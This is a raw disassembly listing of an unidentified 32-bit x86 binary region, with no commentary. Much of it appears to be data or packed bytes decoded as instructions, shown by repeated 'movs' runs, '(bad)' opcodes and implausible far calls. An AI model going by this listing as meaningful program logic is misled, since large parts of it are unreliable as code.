  4224ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ac:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224b4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224bc:	aaa    
  4224bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224be:	fwait
  4224bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c0:	jae    0x422466
  4224c2:	popf   
  4224c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c4:	pop    ss
  4224c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c6:	xchg   ebp,eax
  4224c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224c8:	push   ecx
  4224c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ca:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  4224d1:	inc    edx
  4224d2:	ror    DWORD PTR [eax+esi*8-0x54],1
  4224d6:	imul   BYTE PTR [esi-0x77eb71ea]
  4224dc:	xchg   ecx,eax
  4224dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224de:	aaa    
  4224df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e0:	fwait
  4224e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e2:	jae    0x422488
  4224e4:	popf   
  4224e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e6:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  4224ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ee:	fwait
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  4224f7:	mov    esi,?
  4224f9:	mov    ss,WORD PTR [esi]
  4224fb:	out    dx,al
  4224fc:	adc    al,0xe8
  4224fe:	xchg   ecx,eax
  4224ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422500:	aaa    
  422501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422502:	fwait
  422503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422504:	jae    0x4224aa
  422506:	popf   
  422507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422508:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  42250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422510:	fwait
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42251a:	imul   dh
  42251c:	push   ss
  42251d:	into   
  42251e:	adc    al,0xc8
  422520:	xchg   ecx,eax
  422521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422522:	cmp    eax,0x51a49ba4
  422527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422528:	popf   
  422529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252a:	jnp    0x4224d0
  42252c:	xchg   ebx,eax
  42252d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42252e:	fwait
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	xchg   ecx,eax
  422531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422532:	shl    dl,cl
  422534:	shr    ah,1
  422536:	lock int3 
  422538:	test   dh,0x16
  42253b:	cs adc al,0x28
  42253e:	push   ss
  42253f:	push   cs
  422540:	adc    al,0x8
  422542:	xchg   ebx,eax
  422543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422544:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42254b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42254c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	fwait
  422555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422556:	lea    esp,[edx+edx*8-0xfd32fde]
  42255d:	or     al,0xf6
  42255f:	push   cs
  422560:	push   ss
  422561:	outs   dx,BYTE PTR ds:[esi]
  422562:	adc    al,0x68
  422564:	xchg   ecx,eax
  422565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422566:	add    BYTE PTR [eax],al
  422568:	lock and eax,DWORD PTR [edx+0x0]
  42256c:	cld    
  42256d:	and    eax,0x26040042
  422572:	inc    edx
  422573:	add    BYTE PTR [edi+eiz*1+0x23e80042],cl
  42257a:	inc    edx
  42257b:	add    BYTE PTR [eax],cl
  42257d:	es inc edx
  42257f:	add    BYTE PTR [edx+0x7c],ch
  422582:	inc    edx
  422583:	add    dl,ah
  422585:	jle    0x4225c9
  422587:	add    al,bh
  422589:	es inc edx
  42258b:	add    BYTE PTR [edi+eiz*1+0x42],bh
  42258f:	add    ah,ah
  422591:	and    eax,0x25e80042
  422596:	inc    edx
  422597:	add    BYTE PTR [eax+0x27],bh
  42259a:	inc    edx
  42259b:	add    BYTE PTR [esi+eiz*1+0x42],cl
  42259f:	add    BYTE PTR [edx-0x35],cl
  4225a2:	push   es
  4225a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a4:	scas   al,BYTE PTR es:[edi]
  4225a5:	or     al,0x6
  4225a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a8:	add    BYTE PTR [esi],ah
  4225aa:	inc    edx
  4225ab:	add    BYTE PTR [eax-0x3bffbdda],dh
  4225b1:	es inc edx
  4225b3:	add    al,dl
  4225b5:	es inc edx
  4225b7:	add    al,ah
  4225b9:	es inc edx
  4225bb:	add    BYTE PTR [eax],bh
  4225bd:	es inc edx
  4225bf:	add    ah,ch
  4225c1:	and    eax,DWORD PTR [edx+0x0]
  4225c4:	pop    eax
  4225c5:	es inc edx
  4225c7:	add    BYTE PTR [eax+0x26],cl
  4225ca:	inc    edx
  4225cb:	add    BYTE PTR [eax-0x51ffbdd9],dl
  4225d1:	call   0xbde7:0x4338a406
  4225d8:	push   0x70004226
  4225dd:	es inc edx
  4225df:	add    BYTE PTR [esi+eiz*1],cl
  4225e2:	inc    edx
  4225e3:	add    BYTE PTR [edi+eax*4],ah
  4225e6:	loopne 0x4225a5
  4225e8:	jbe    0x422665
  4225ea:	pop    ds
  4225eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ec:	add    BYTE PTR [eax],al
  4225ee:	inc    eax
  4225ef:	add    dl,ch
  4225f1:	rcl    dl,cl
  4225f3:	pop    ecx
  4225f4:	fistp  QWORD PTR [esi+0x42]
  4225f7:	add    bl,bl
  4225f9:	outs   dx,DWORD PTR fs:[esi]
  4225fb:	arpl   WORD PTR [edi+0xf],si
  4225fe:	pop    ebx
  4225ff:	xor    DWORD PTR [esi-0x5],esi
  422602:	(bad)  
  422603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422604:	mov    dl,0xc
  422606:	xchg   ebx,eax
  422607:	test   al,0xf4
  422609:	and    eax,0xdaaa0042
  42260e:	push   es
  42260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422610:	stos   BYTE PTR es:[edi],al
  422611:	fiadd  WORD PTR [esi]
  422613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422615:	fiadd  DWORD PTR [esi]
  422617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422618:	mov    ds:0xbea406da,al
  42261d:	fiadd  DWORD PTR [esi]
  42261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422620:	mov    edx,0xb6a406da
  422625:	fiadd  DWORD PTR [esi]
  422627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422628:	mov    dl,0xda
  42262a:	push   es
  42262b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42262c:	mov    ds,edx
  42262e:	push   es
  42262f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422630:	mov    bl,dl
  422632:	push   es
  422633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422634:	out    dx,al
  422635:	fiadd  DWORD PTR [esi]
  422637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422638:	dec    DWORD PTR [ebx]
  42263a:	adc    edi,DWORD PTR [edx]
  42263c:	in     al,0x23
  42263e:	inc    edx
  42263f:	add    ch,dl
  422641:	sub    BYTE PTR [edx+0x0],al
  422644:	pop    ss
  422645:	loop   0x4225d0
  422647:	js     0x4225f7
  422649:	call   0xa4d7:0xcb3aa406
  422650:	and    al,0x75
  422652:	add    BYTE PTR [eax],al
  422654:	loopne 0x422679
  422656:	inc    edx
  422657:	add    BYTE PTR [edx],ah
  422659:	inc    ebx
  42265a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422668:	hlt    
  422669:	clc    
  42266a:	sar    BYTE PTR [ebp+0x319340bf],cl
  422670:	sub    eax,DWORD PTR [edi+0x1f]
  422673:	jle    0x422675
	...
  422699:	add    BYTE PTR [eax],al
  42269b:	add    BYTE PTR [edx+0x7c],ch
  42269e:	inc    edx
	...
  4226ab:	add    cl,bh
  4226ad:	jmp    0xa48f26f3
  4226b2:	push   ecx
  4226b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b4:	jg     0x42265a
  4226b6:	inc    edi
  4226b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b8:	push   ecx
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	inc    ebx
  4226bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226bc:	std    
  4226bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226be:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c6:	push   ebx
  4226c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c8:	dec    ecx
  4226c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ca:	std    
  4226cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226cc:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  4226d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d4:	push   ecx
  4226d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d6:	jg     0x42267c
  4226d8:	std    
  4226d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226da:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  4226e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e2:	dec    ebx
  4226e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e4:	inc    ebx
  4226e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e6:	jne    0x42268c
  4226e8:	pop    ecx
  4226e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ea:	jnp    0x422690
  4226ec:	dec    ecx
  4226ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ee:	fwait
  4226ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4226f8:	xor    eax,eax
  4226fa:	xor    esp,DWORD PTR [eax]
  4226fc:	xor    eax,DWORD PTR [eax]
  4226fe:	xor    esp,DWORD PTR [eax+0x33]
  422701:	inc    eax
  422702:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  422708:	xor    al,al
  42270a:	xor    ah,BYTE PTR [eax]
  42270c:	xor    al,BYTE PTR [eax]
  42270e:	xor    ah,BYTE PTR [eax+0x32]
  422711:	inc    eax
  422712:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422718:	xor    ecx,esp
  42271a:	xor    ecx,esi
  42271c:	xor    ecx,eax
  42271e:	xor    ecx,edx
  422720:	xor    edx,esp
  422722:	xor    edx,esi
  422724:	xor    edx,eax
  422726:	xor    edx,edx
  422728:	xor    ebx,esp
  42272a:	xor    ebx,esi
  42272c:	xor    ebx,eax
  42272e:	xor    ebx,edx
  422730:	xor    eax,esi
  422732:	push   ebx
  422733:	shl    BYTE PTR [ebx-0x40],0x93
  422737:	rcl    DWORD PTR [esi-0x56],0x15
  42273b:	into   
  42273c:	xchg   ebp,eax
  42273d:	dec    ecx
  42273e:	xor    ecx,esp
  422740:	sbb    eax,0x50abaae2
  422745:	push   0x1e
  422747:	cs je  0x42275e
  42274a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422750:	imul   edi,edx,0xffffffd5
  422753:	leave  
  422754:	daa    
  422755:	dec    eax
  422756:	out    dx,eax
  422757:	pushf  
  422758:	mov    dh,0xdf
  42275a:	dec    esi
  42275b:	xchg   ebp,eax
  42275c:	lock xor DWORD PTR [esi-0x6c],ebp
  422760:	inc    ebp
  422761:	or     eax,0xc1470876
  422766:	js     0x422723
  422768:	popa   
  422769:	pop    ecx
  42276a:	jecxz  0x4227d7
  42276c:	mov    BYTE PTR [edx-0x56],0x5
  422770:	cs enter 0xaa46,0x44
  422775:	aas    
  422776:	inc    ebp
  422777:	leave  
  422778:	test   BYTE PTR [ebx+0x819a593],0xd8
  42277f:	jl     0x4227f9
  422781:	mov    es,WORD PTR [edx+0x0]
  422784:	jb     0x4227e0
  422786:	pop    ss
  422787:	sub    ebp,esp
  422789:	and    eax,0x26500042
  42278e:	inc    edx
  42278f:	add    BYTE PTR [esi-0x5],dh
  422792:	fbld   TBYTE PTR [ebp+0x0]
	...
  4227a0:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  4227a6:	popa   
  4227a7:	arpl   WORD PTR [edi+0x7a],bp
  4227aa:	popa   
  4227ab:	outs   dx,DWORD PTR ds:[si]
  4227ad:	gs ins DWORD PTR es:[edi],dx
  4227af:	jae    0x4227f3
  4227b1:	outs   dx,DWORD PTR ds:[esi]
  4227b2:	ins    BYTE PTR es:[edi],dx
  4227b3:	gs mov cl,0x65
  4227b6:	in     eax,dx
  4227b7:	jg     0x4227f2
  4227b9:	ja     0x422824
  4227bb:	jp     0x4227b0
  4227bd:	inc    esp
  4227be:	push   0x1b
  4227c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c1:	push   ecx
  4227c2:	dec    esp
  4227c3:	gs jb  0x42283f
  4227c6:	popa   
  4227c7:	push   ebx
  4227c8:	jne    0x42283b
  4227ca:	jae    0x42282d
  4227cc:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  4227d3:	inc    esp
  4227d4:	(bad)  [edx+0x65]
  4227d7:	jae    0x42282f
  4227d9:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  4227e0:	jb     0x422844
  4227e2:	gs je  0x4227b8
  4227e5:	lds    edx,FWORD PTR [eax-0x68]
  4227e8:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  4227ec:	fs jne 0x42285e
  4227ef:	push   eax
  4227f0:	gs fs jae 0x422861
  4227f4:	popa   
  4227f5:	ins    DWORD PTR es:[edi],dx
  4227f6:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  422809:	add    BYTE PTR [eax],al
  42280b:	add    BYTE PTR [esp+ecx*4],ch
  42280e:	push   ss
  42280f:	mov    esi,0x6f4c8773
  422814:	jb     0x422884
  422816:	jno    0x422881
  422818:	or     al,0x36
  42281a:	lods   al,BYTE PTR ds:[esi]
  42281b:	repnz push edx
  42281d:	je     0x42288e
  42281f:	je     0x422865
  422821:	js     0x4227df
  422823:	cmc    
  422824:	outs   dx,DWORD PTR ds:[esi]
  422825:	ins    DWORD PTR es:[edi],dx
  422826:	popa   
  422827:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42282e:	popa   
  42282f:	jb     0x4228a6
  422831:	push   0x68736f79
  422836:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42283d:	mov    ch,0xa5
  42283f:	jns    0x4228b4
  422841:	outs   dx,DWORD PTR ds:[esi]
  422842:	addr16 popa 
  422844:	add    BYTE PTR [bp+si],bh
  422847:	sub    bh,cl
  422849:	icebp  
  42284a:	gs ins BYTE PTR es:[edi],dx
  42284c:	jae    0x422896
  42284e:	popa   
  42284f:	je     0x4228b9
  422851:	ins    DWORD PTR es:[edi],dx
  422852:	add    BYTE PTR gs:[bx+si],al
  422856:	in     al,dx
  422857:	mov    ecx,0x414ad1d2
  42285c:	ins    DWORD PTR es:[edi],dx
  42285d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422864:	gs ins DWORD PTR es:[edi],dx
  422866:	add    BYTE PTR [eax],al
  422868:	jne    0x42287a
  42286a:	popa   
  42286b:	or     BYTE PTR [esi+0x73654dbb],al
  422871:	popa   
  422872:	push   0x78000061
  422877:	loope  0x4228bb
  422879:	stos   BYTE PTR es:[edi],al
  42287a:	je     0x4228dd
  42287c:	push   edi
  42287d:	popa   
  42287e:	jb     0x4228eb
  422880:	jae    0x4228ed
  422882:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  422889:	loope  0x422857
  42288b:	aad    0x6f
  42288d:	jb     0x4228fb
  42288f:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  422896:	je     0x4228ab
  422898:	adc    al,BYTE PTR [ebp+0x77646172]
  42289e:	outs   dx,DWORD PTR ds:[esi]
  42289f:	gs ins DWORD PTR es:[edi],dx
  4228a1:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  4228a8:	outs   dx,BYTE PTR ds:[esi]
  4228a9:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228b0:	ja     0x422916
  4228b2:	outs   dx,DWORD PTR ds:[esi]
  4228b3:	popa   
  4228b4:	outs   dx,BYTE PTR ds:[esi]
  4228b5:	gs jae 0x42291a
  4228b8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228bf:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228c7:	inc    ebx
  4228c8:	jb     0x422883
  4228ca:	sbb    al,0xd9
  4228cc:	jo     0x422937
  4228ce:	addr16 js 0x422946
  4228d1:	jo     0x422948
  4228d3:	fs add ch,cl
  4228d6:	xchg   esi,eax
  4228d7:	in     eax,dx
  4228d8:	jno    0x42294b
  4228da:	iret   
  4228db:	jbe    0x4228d6
  4228dd:	or     dh,BYTE PTR [esi-0x3]
  4228e0:	cwde   
  4228e1:	int    0xd6
  4228e3:	std    
  4228e4:	pop    ebp
  4228e5:	fsubr  DWORD PTR [edi]
  4228e7:	dec    edx
  4228e8:	xor    eax,0xd6cd860a
  4228ed:	stc    
  4228ee:	inc    ebx
  4228ef:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  4228f5:	dec    edx
  4228f6:	sbb    BYTE PTR [ecx+0x52],bh
  4228f9:	mov    ch,al
  4228fb:	jns    0x42294f
  4228fd:	dec    edx
  4228fe:	sbb    BYTE PTR [ecx+0x6e],bh
  422901:	xchg   edx,eax
  422902:	cmp    eax,0xcd96c5cb
  422907:	in     eax,dx
  422908:	jno    0x42297b
  42290a:	iret   
  42290b:	jbe    0x422906
  42290d:	or     dh,BYTE PTR [esi-0x3]
  422910:	int    0x96
  422912:	std    
  422913:	pop    ebp
  422914:	jns    0x422961
  422916:	pop    edx
  422917:	xor    eax,0x96cd920a
  42291c:	stc    
  42291d:	inc    ebx
  42291e:	icebp  
  42291f:	(bad)  
  422920:	das    
  422921:	int    0x76
  422923:	mov    BYTE PTR [ecx+0x6e],bh
  422926:	mov    DWORD PTR [edx-0x13749387],esi
  42292c:	jns    0x42299c
  42292e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422934:	retf   
  422935:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42293c:	jno    0x42290d
  42293e:	jbe    0x422939
  422940:	or     dh,BYTE PTR [esi-0x3]
  422943:	int    0x96
  422945:	std    
  422946:	pop    ebp
  422947:	fdiv   DWORD PTR [ebx-0x6df55465]
  42294d:	int    0x96
  42294f:	stc    
  422950:	inc    ebx
  422951:	icebp  
  422952:	(bad)  
  422953:	test   BYTE PTR [ecx+0x6e],bh
  422956:	mov    ebp,esp
  422958:	int    0x76
  42295a:	mov    BYTE PTR [ecx+0x6e],bh
  42295d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422964:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42296b:	jno    0x42293c
  42296d:	jbe    0x422968
  42296f:	or     dh,BYTE PTR [esi-0x3]
  422972:	cwde   
  422973:	int    0xd6
  422975:	std    
  422976:	pop    ebp
  422977:	ret    0x2be4
  42297a:	cmp    DWORD PTR [edx],ecx
  42297c:	xchg   ch,cl
  42297e:	(bad)  
  42297f:	stc    
  422980:	inc    ebx
  422981:	adc    DWORD PTR [eax+0x52794ad6],ebp
  422987:	test   BYTE PTR [ebx-0x78913648],ch
  42298d:	ret    0x79ab
  422990:	xchg   edx,eax
  422991:	aad    0xcb
  422993:	lds    edx,FWORD PTR [esi+0x7171edcd]
  422999:	iret   
  42299a:	jbe    0x422995
  42299c:	or     dh,BYTE PTR [esi-0x3]
  42299f:	int    0x96
  4229a1:	std    
  4229a2:	pop    ebp
  4229a3:	pop    ecx
  4229a4:	ins    BYTE PTR es:[edi],dx
  4229a5:	cmp    dh,BYTE PTR ds:0x96cd920a
  4229ab:	stc    
  4229ac:	inc    ebx
  4229ad:	icebp  
  4229ae:	(bad)  
  4229af:	push   ebx
  4229b0:	int    0x76
  4229b2:	mov    BYTE PTR [ecx+0x6e],bh
  4229b5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229bb:	jns    0x422a2b
  4229bd:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229c3:	call   0xcded:0xcd965b98
  4229ca:	jbe    0x422a00
  4229cc:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  4229d3:	sbb    al,0x81
  4229d5:	(bad)  
  4229d6:	and    al,0x98
  4229d8:	int    0xd6
  4229da:	adc    al,0x47
  4229dc:	mov    ds:0xff8eca62,al
  4229e1:	add    al,0x7d
  4229e3:	add    ch,dl
  4229e5:	lods   eax,DWORD PTR ds:[esi]
  4229e6:	clc    
  4229e7:	icebp  
  4229e8:	jo     0x4229b4
  4229ea:	(bad)  
  4229ec:	jge    0x4229ee
  4229ee:	aad    0xad
  4229f0:	clc    
  4229f1:	icebp  
  4229f2:	jo     0x422986
  4229f4:	adc    ecx,ebp
  4229f6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229fd:	jo     0x422a6f
  4229ff:	jo     0x422a71
  422a01:	jo     0x42299d
  422a03:	xor    esi,edi
  422a05:	cwde   
  422a06:	add    al,0xc
  422a08:	add    BYTE PTR [ebp-0x80],bl
  422a0b:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a11:	or     DWORD PTR [eax-0x75],ebx
  422a14:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a1b:	jecxz  0x422a08
  422a1d:	hlt    
  422a1e:	scas   eax,DWORD PTR es:[edi]
  422a1f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a26:	sub    dl,0xfa
  422a29:	iret   
  422a2a:	pop    eax
  422a2b:	iret   
  422a2c:	push   0xffffffcd
  422a2e:	out    0xfd,al
  422a30:	int    0x76
  422a32:	adc    DWORD PTR [ebx],esi
  422a34:	out    0x34,al
  422a36:	sub    ecx,ecx
  422a38:	or     dh,BYTE PTR [esi-0x43]
  422a3b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a41:	sub    BYTE PTR [edi],0x6
  422a44:	sub    DWORD PTR [eax-0x72357f80],eax
  422a4a:	cmc    
  422a4b:	sub    esp,esi
  422a4d:	in     eax,dx
  422a4e:	aad    0xe9
  422a50:	add    ebx,ebp
  422a52:	mov    bh,dh
  422a54:	fcmovnbe st,st(5)
  422a56:	out    dx,eax
  422a57:	pushf  
  422a58:	xchg   edi,edi
  422a5a:	test   al,0xcf
  422a5c:	fs adc ebx,0xffffffe9
  422a60:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a64:	iret   
  422a65:	int3   
  422a66:	call   0x80c2792f
  422a6b:	jno    0x422a05
  422a6d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a77:	int    0xe6
  422a79:	std    
  422a7a:	xor    esp,esi
  422a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a7d:	das    
  422a7e:	pop    ecx
  422a7f:	push   0xffffffcd
  422a81:	(bad)  
  422a82:	or     eax,0xfcde9e3
  422a87:	sub    edi,eax
  422a89:	xchg   DWORD PTR [edi],ecx
  422a8b:	iret   
  422a8c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a92:	add    BYTE PTR [eax-0x102c8233],0x88
  422a99:	add    al,0xf2
  422a9b:	add    DWORD PTR [ebx+0x2],0x80818069
  422aa2:	adc    dh,0x4e
  422aa5:	inc    ebx
  422aa6:	jns    0x422a2a
  422aa8:	fldlg2 
  422aaa:	es int 0xc6
  422aad:	or     eax,0x809221bd
  422ab2:	add    al,0x81
  422ab5:	mov    al,ds:0xfb87d287
  422aba:	add    al,0xbd
  422abc:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422ac3:	jns    0x422a92
  422ac5:	ins    DWORD PTR es:[edi],dx
  422ac6:	and    ch,0xa0
  422ac9:	push   edx
  422aca:	add    al,0x3
  422acc:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422ad2:	push   edx
  422ad3:	add    al,0x3
  422ad5:	push   ebx
  422ad6:	mov    al,cl
  422ad8:	test   bh,bh
  422ada:	retf   
  422adb:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422ae3:	(bad)  
  422ae4:	in     al,dx
  422ae5:	outs   dx,DWORD PTR ds:[esi]
  422ae6:	rcl    bl,1
  422ae8:	(bad)  
  422ae9:	jge    0x422aa8
  422aeb:	outs   dx,DWORD PTR ds:[esi]
  422aec:	xchg   edx,eax
  422aed:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422af4:	sahf   
  422af5:	mov    al,ds:0x3454009e
  422afa:	jno    0x422b5e
  422afc:	popa   
  422afd:	mov    ah,0x86
  422aff:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422b06:	push   cs
  422b07:	(bad)  
  422b08:	jge    0x422ac7
  422b0a:	push   eax
  422b0b:	xchg   edx,eax
  422b0c:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b13:	jge    0x422ad2
  422b15:	push   ss
  422b16:	xchg   edx,eax
  422b17:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b1e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b24:	jo     0x422af3
  422b26:	(bad)  
  422b27:	std    
  422b28:	xor    edx,esi
  422b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b2b:	inc    ebx
  422b2c:	(bad)  
  422b2d:	xor    al,0x2f
  422b2f:	or     esp,ebx
  422b31:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b3b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b45:	int    0xd6
  422b47:	popf   
  422b48:	aam    0x23
  422b4a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b50:	or     ch,0xd6
  422b53:	xchg   ebp,eax
  422b54:	aam    0x89
  422b56:	int    0xd6
  422b58:	icebp  
  422b59:	int    0x8d
  422b5b:	xchg   ebp,eax
  422b5c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b62:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b68:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b6e:	pushf  
  422b6f:	stos   BYTE PTR es:[edi],al
  422b70:	sahf   
  422b71:	popa   
  422b72:	mov    esp,0xc180804a
  422b77:	mov    BYTE PTR [edi+0x649a62d9],al
  422b7d:	mov    ecx,edx
  422b7f:	rol    DWORD PTR [edx+0x70878492],cl
  422b85:	int    0xc6
  422b87:	or     eax,0x808169bd
  422b8c:	adc    dh,0x14
  422b8f:	int    0x76
  422b91:	mov    ebp,0xd30de6cd
  422b96:	lods   eax,DWORD PTR ds:[esi]
  422b97:	xchg   DWORD PTR [ebx],esi
  422b99:	retf   
  422b9a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422ba1:	in     al,dx
  422ba2:	push   esi
  422ba3:	int    0xc6
  422ba5:	or     eax,0xbd92c704
  422baa:	daa    
  422bab:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422bb5:	or     eax,0xc087add3
  422bba:	mov    BYTE PTR [esi-0x30577740],bl
  422bc0:	gs jp  0x422b47
  422bc3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bcd:	xchg   esi,esp
  422bcf:	or     eax,0x699e30c0
  422bd4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bdb:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bde:	int    0x10
  422be0:	mov    ebp,0x808081bc
  422be5:	int    0x7d
  422be7:	xor    ecx,DWORD PTR [edi]
  422be9:	xor    ah,0x81
  422bec:	lea    esi,[ebp-0x7b8a19fc]
  422bf2:	das    
  422bf3:	add    al,0xd0
  422bf5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bfc:	int    0x8d
  422bfe:	mov    ch,0x4
  422c00:	cli    
  422c01:	test   BYTE PTR [edx-0x61783f79],al
  422c07:	int    0xe6
